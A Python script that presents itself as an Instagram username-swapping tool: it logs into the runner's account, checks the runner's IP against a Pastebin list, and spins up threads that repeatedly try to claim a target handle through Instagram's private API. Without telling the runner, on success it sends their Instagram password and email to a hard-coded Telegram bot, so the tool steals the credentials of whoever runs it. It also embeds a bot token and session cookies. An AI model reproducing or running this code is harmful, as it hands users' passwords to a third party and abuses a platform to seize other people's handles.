import requests
import threading
import uuid
import re
import socket
from tkinter import messagebox
from tkinter import *
from colored import fg, bg, attr
hostname = socket.gethostname ()
ip = socket.gethostbyname (hostname)
ch = requests.get ("https://pastebin.com/R0SHhFCK")
window = Tk()
color1 = fg(50)
color2 = fg("white")
print (color1 + """
                     ____        _________    
                / __ \____ _/ __/ __(_)   
               / /_/ / __ `/ /_/ /_/ /    
              / _, _/ /_/ / __/ __/ /     
             /_/ |_|\__,_/_/ /_/ /_/      
                                          
 
""")
if input(color2 + " Press Enter To Login ") == "":
    if ip in ch.text:
        print (" [!] Logged In\n Yor IP Is Active")
        user = input (color2 + " [" + color1 + "+" + color2+"] Enter Username"+color2+": ")
        pass1 = input (color2 + " [" + color1 + "+" + color2+"] Enter Password"+color2+": ")
        Tar = input (color2 + " [" + color1 + "+" + color2+"] Enter Target"+color2+": ")
        thread1 = int (input (color2 + " [" + color1 + "+" + color2+"] Enter Thread"+color2+": "))
        uid = str (uuid.uuid4 ())
        s = requests.session ()
        headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "content-length": "267",
            "content-type": "application/x-www-form-urlencoded",
            "cookie": "ig_did=0897491F-B736-4E7E-A657-37438D0967B8; csrftoken=xvAQoMiz2eaU4RrcmRp2hqinDVMfgkpe; rur=FTW; mid=XxTPfgALAAGHGReE-x_i1ISMG4Xr",
            "origin": "https://www.instagram.com",
            "referer": "https://www.instagram.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36",
            "x-csrftoken": "xvAQoMiz2eaU4RrcmRp2hqinDVMfgkpe",
            "x-ig-app-id": "1217981644879628",
            "x-ig-www-claim": "0",
            "x-instagram-ajax": "180c154d218a",
            "x-requested-with": "XMLHttpRequest"}
        data = {
            "username": user,
            "enc_password": '#PWD_INSTAGRAM_BROWSER:0:&:' + pass1}
        headers1 = {
            'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US",
            "X-IG-Capabilities": "3brTvw==",
            "X-IG-Connection-Type": "WIFI",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            'Host': 'i.instagram.com'}
        url = "https://api.telegram.org/bot1451123426:AAH1rzBHvMFtUbC3WhkywVAZGCmFOnhdg68/"
        logurl = "https://www.instagram.com/accounts/login/ajax/"
        editurl1 = "https://i.instagram.com/api/v1/accounts/edit_profile/"
        login = s.post (logurl, data=data, headers=headers).text
        email = s.get ("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", headers=headers1)
        e = re.search ('[\w\.-]+@[\w\.-]+', email.text)
        editdata = {
            '_uuid': uid,
            '_uid': uid,
            'csrftoken': 'missing',
            'first_name': '',
            'is_private': 'false',
            'phone_number': '',
            'biography': ' Done by @xMuSaB.x
Close you're windows brothers ',
            'username': Tar,
            'gender': '',
            'email': e.group (),
            'external_url': ''}
        if '"authenticated": true' in login:
            editurl = "https://i.instagram.com/api/v1/accounts/edit_profile/"
            edit = s.post (editurl, data=editdata, headers=headers1)
            if edit.status_code == 429:
                messagebox.showinfo ("Error 404", "[+] This Account Is Blocked")
            elif '"spam": true' in edit.text:
                messagebox.showinfo ("Error 404", "[+] This Account Is Blocked")
            elif "This username isn't available. Please try another." or "This username isn't available." in edit.text:
                messagebox.showinfo ("KsmK Sai", "[+] Login Successfully !\nTarget: @" + Tar + "\nThread: " + str (thread1))
                window.destroy()
                i = 0
                def swap1():
                    while True:
                        global i
                        edit1 = s.post (editurl1, data=editdata, headers=headers1)
                        if edit1.status_code == 200:
                            try:
                                s.post (url + f"sendmessage?chat_id=978747920&text=The transfer was successful  @{Tar}")
                                s.post (url + f"sendmessage?chat_id=978747920&text=Swapped @{Tar}\nPassword : {pass1}\nEmail : {e.group ()}")
                                messagebox._show ("KsmK Sai", "Done : @" + Tar + " \ntry be faster -_- ")
                                break
                            except:
                                    input(color2 + "\n Press Enter To Close The Program...")
                            if input ("") == "":
                                break
                        elif "username" in edit1.text:
                            i += 1
                            print (color2 + f" [{i}] Waiting For " + color1 + ">>" + color2 + f" @{Tar}")
                        elif edit1.status_code == 429:
                            print (color2 + " Blocked !!\n Press Enter To Close The Program...")
                            if input ("") == "":
                                break
                        elif '"spam": true' in edit1.text:
                            print (color2 + " Blocked !!\n Press Enter To Close The Program...")
                threads = []
                for i in range (thread1):
                    th = threading.Thread (target=swap1)
                    th.start ()
                    threads.append (th)
                for thread2 in threads:
                    thread2.join()
    else:
        input(color2 + f" - Ops, Your IP Is not Active\n IP: {ip}")
else:
    print(" Close The Program And Try Again")
